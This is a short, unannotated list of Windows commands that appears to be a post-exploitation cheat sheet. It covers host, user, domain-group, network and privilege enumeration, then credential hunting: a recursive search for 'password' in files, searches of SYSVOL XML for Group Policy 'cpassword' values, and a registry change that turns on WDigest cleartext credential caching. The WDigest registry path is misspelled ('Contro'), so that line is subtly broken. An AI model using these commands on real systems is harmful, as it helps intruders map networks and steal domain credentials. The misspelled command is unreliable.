systeminfo
hostname 
wmic qfe get Caption,Description,HotFixID,InstalledOn
net users
net localgroups
net localgroup Administrators
net user itadmin
net user itadmin /domain
net group Administrators /domain
ipconfig /all
route print
arp -A
whoami /priv
findstr /spin "password" *.*
tasklist /SVC
netstat -ano
reg add HKLM\SYSTEM\CurrentControlSet\Contro\SecurityProviders\Wdigest /v UseLogonCredential /t Reg_DWORD /d 1
findstr /S cpassword $env:logonserver\sysvol\*.xml
findstr /S cpassword %logonserver%\sysvol\*.xml
